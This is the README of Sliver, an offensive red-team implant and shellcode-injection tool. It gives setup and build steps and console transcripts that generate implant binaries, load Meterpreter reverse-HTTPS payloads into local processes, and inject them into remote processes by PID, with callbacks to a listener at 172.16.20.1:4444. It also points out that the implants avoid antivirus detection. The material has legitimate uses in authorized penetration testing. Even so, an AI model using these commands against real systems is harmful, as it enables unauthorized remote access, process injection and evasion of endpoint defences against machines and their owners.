Sliver
======

![Sliver](/sliver/sliver.jpeg)

Sliver is a remote shellcode loading and injection service that uses end-to-end encryption (mTLS) for all network traffic. Implants are dynamically compiled with unique X.509 certificates signed by a per-instance certificate authority generated when you first run the binary. Sliver can load arbitrary shellcode but also integrates with MSFVenom to automatically generate, execute, and manage Meterpreter payloads. Sliver binaries have very low anti-virus detection as they do not contain any malicous code themselves and instead dynamically load it over the network.

Sliver can inject payloads into it's own process or optionally use remote thread injection to execute payloads in a remote processes to which your execution context has access.

```
[attacker] <-(mTLS)-> [sliver] -(code injection)-> [remote process]
```

Sliver is designed to be secure-by-default and have as few dependancies as possible.

### Setup

1. Install Metasploit Framework v5 or later
2. Download the latest [Sliver](https://github.com/BishopFox/sliver/releases) binary
3. ???
4. Shellz

### Generating Client Binaries

Simply use the `gen` command to generate client binaries on the fly:

```
[*] Welcome to the sliver shell, see `help` for available commands

sliver > gen -save /root/ -lhost 172.16.20.1
 gen -save /root/ -lhost 172.16.20.1

[*] Generating new windows/amd64 sliver binary, please wait ...
[*] Generated sliver binary at: /root/DEVELOPING_CLEAVAGE.exe
```

You're done! The binary has already been embedded with a unique X.509 certificate (for mutual TLS) and the server configuration.


### Local Thread Execution

Execute shellcode in the local process:

```
sliver (NURSING_BEETLE) > msf -lhost 172.16.20.1
 msf -lhost 172.16.20.1
[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> NURSING_BEETLE
[*] Sucessfully sent payload
```

### Remote Thread Injection

Inject shellcode into remote processes:

```
sliver (NURSING_BEETLE) > inject -pid 3100 -lhost 172.16.20.1
 inject -pid 3100 -lhost 172.16.20.1
[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> NURSING_BEETLE -> PID: 3100
[*] Sucessfully sent payload
```

Sliver also has a built-in `ps` command.

### Multi-player Mode

Sliver can also execute multiple payloads per connection. This can be helpful if your meterpreter session dies, or if you want to play with friends:

```
sliver (STUPID_AIRBAG) > msf -lhost 172.16.20.1
 msf -lhost 172.16.20.1
[*] Generating windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> STUPID_AIRBAG
[*] Sucessfully sent payload
sliver (STUPID_AIRBAG) > msf -lhost 172.16.20.2
 msf -lhost 172.16.20.2
[*] Generating windows/amd64 -> 172.16.20.2:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> STUPID_AIRBAG
[*] Sucessfully sent payload
```

## Compile From Source

You'll want to compile from a MacOS or Linux machine, compiling from Windows should work but none of the scripts are designed to run on Windows (you can compile the Windows binaries from MacOS or Linux).

Requirements for Compiling:
* Metasploit Framework v5 or later
* Go v1.11 or later
* `make`, `sed`, `tar`, `wget`, `zip` commands
* [Dep](https://golang.github.io/dep/)

Build thin server (for developement)

```
$ dep ensure
$ ./go-assets.sh
$ make
```

Statically compile and bundle server with all dependencies and assets:

```
$ dep ensure
$ ./go-assets.sh
$ make static-macos
$ make static-linux
$ make static-windows
```
